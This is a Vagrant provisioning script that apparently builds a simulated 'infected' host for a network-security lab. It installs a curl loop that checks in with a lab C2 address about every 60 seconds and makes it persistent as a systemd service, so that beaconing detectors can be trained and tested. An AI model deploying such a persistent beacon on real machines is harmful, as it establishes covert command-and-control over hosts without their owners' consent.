#!/usr/bin/env bash
# bot.nt2102.ch — "infected" LAN host that beacons to C2 every ~60s with low jitter.
set -euxo pipefail
export DEBIAN_FRONTEND=noninteractive

# shellcheck source=/vagrant/provision/_lib.sh
source /vagrant/provision/_lib.sh

mount_data_disk /data

install_lab_routes \
    "198.51.100.0/24 via 10.21.2.11" \
    "203.0.113.0/24 via 10.21.2.11"

grep -q "nt2102.ch" /etc/hosts || cat >> /etc/hosts <<'EOF'
10.21.2.11    sensor.nt2102.ch      sensor
10.21.2.12    web-victim.nt2102.ch  web-victim
10.21.2.13    srv-victim.nt2102.ch  srv-victim
198.51.100.102 attacker.nt2102.ch   attacker
203.0.113.102  c2.nt2102.ch         c2
EOF

apt-get update -y
apt-get install -y --no-install-recommends curl

cat > /opt/beacon.sh <<'EOF'
#!/usr/bin/env bash
# Beacon every ~60s with small random jitter (0-10s). Low jitter on purpose so RITA / beaconing
# detectors have a strong periodicity signal.
while true; do
    curl -s -o /dev/null "http://203.0.113.102:8080/checkin?id=bot-$(hostname)" || true
    sleep $((55 + RANDOM % 11))
done
EOF
chmod +x /opt/beacon.sh

cat > /etc/systemd/system/beacon.service <<'UNIT'
[Unit]
Description=NT2102 fake botnet beacon client
After=network-online.target lab-routes.service
Wants=lab-routes.service

[Service]
ExecStart=/opt/beacon.sh
Restart=always

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable --now beacon.service

echo "bot.nt2102.ch provisioning done. Beaconing to c2.nt2102.ch every ~60s."
report_reboot_requirement
